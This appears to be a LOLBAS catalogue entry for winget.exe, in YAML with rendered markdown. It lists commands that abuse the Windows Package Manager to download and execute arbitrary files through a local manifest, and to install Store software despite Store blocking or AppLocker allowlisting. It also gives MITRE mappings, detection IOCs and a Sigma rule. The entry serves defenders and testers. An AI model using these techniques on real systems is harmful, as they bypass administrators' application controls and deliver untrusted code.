---
Acknowledgement:
- Handle: '@saulpanders'
  Person: Paul
- Person: Konrad 'unrooted' Klawikowski
- Person: Fredrik H. Brat
Author: Paul Sanders
Code_Sample:
- Code: https://gist.github.com/saulpanders/00e1177602a8c01a3a8bfa932b3886b0
Commands:
- Category: Execute
  Command: winget.exe install --manifest {PATH:.yml}
  Description: 'Downloads a file from the web address specified in .yml file and executes
    it on the system. Local manifest setting must be enabled in winget for it to work:
    `winget settings --enable LocalManifestFiles`'
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: Local Administrator - required to enable local manifest setting
  Tags:
  - Execute: Remote
  - Execute: EXE
  Usecase: Download and execute an arbitrary file from the internet
- Category: Download
  Command: winget.exe install --accept-package-agreements -s msstore {name or ID}
  Description: 'Download and install any software from the Microsoft Store using its
    name or Store ID, even if the Microsoft Store App itself is blocked on the machine.
    For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump,
    PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.'
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download and install software from Microsoft Store, even if Microsoft Store
    App is blocked
- Category: AWL Bypass
  Command: winget.exe install --accept-package-agreements -s msstore {name or ID}
  Description: 'Download and install any software from the Microsoft Store using its
    name or Store ID, even if the Microsoft Store App itself is blocked on the machine,
    and even if AppLocker is active on the machine. For example, use "Sysinternals
    Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite.
    Note: a Microsoft account is required for this.'
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download and install software from Microsoft Store, even if Microsoft Store
    App is blocked, and AppLocker is activated on the machine
Created: 2022-01-03
Description: Windows Package Manager tool
Detection:
- IOC: winget.exe spawned with local manifest file
- IOC: Sysmon Event ID 1 - Process Creation
- Analysis: https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html
- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_winget_local_install_via_manifest.yml
Full_Path:
- Path: C:\Users\user\AppData\Local\Microsoft\WindowsApps\winget.exe
Name: winget.exe
Resources:
- Link: https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html
- Link: https://docs.microsoft.com/en-us/windows/package-manager/winget/#production-recommended
- Link: https://www.youtube.com/watch?v=zuL7x4Wltto
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# winget.exe

Windows Package Manager tool

# Path(s)

- `C:\Users\user\AppData\Local\Microsoft\WindowsApps\winget.exe`

# Download Commands

Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.

```batch
winget.exe install --accept-package-agreements -s msstore {name or ID}
```

- **Usecase:** Download and install software from Microsoft Store, even if Microsoft Store App is blocked
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# AWL Bypass Commands

Download and install any software from the Microsoft Store using its name or Store ID, even if the Microsoft Store App itself is blocked on the machine, and even if AppLocker is active on the machine. For example, use "Sysinternals Suite" or `9p7knl5rwt25` for obtaining ProcDump, PsExec via the Sysinternals Suite. Note: a Microsoft account is required for this.

```batch
winget.exe install --accept-package-agreements -s msstore {name or ID}
```

- **Usecase:** Download and install software from Microsoft Store, even if Microsoft Store App is blocked, and AppLocker is activated on the machine
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Execute Commands

Downloads a file from the web address specified in .yml file and executes it on the system. Local manifest setting must be enabled in winget for it to work: `winget settings --enable LocalManifestFiles`

```batch
winget.exe install --manifest {PATH:.yml}
```

- **Usecase:** Download and execute an arbitrary file from the internet
- **Privileges Required:** Local Administrator - required to enable local manifest setting
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://saulpanders.github.io/2022/01/02/New-Year-New-LOLBAS.html
- https://docs.microsoft.com/en-us/windows/package-manager/winget/#production-recommended
- https://www.youtube.com/watch?v=zuL7x4Wltto
# Acknowledgements

- Paul Sanders (Authored, 2022-01-03)
- Paul (@saulpanders)
- Konrad 'unrooted' Klawikowski
- Fredrik H. Brat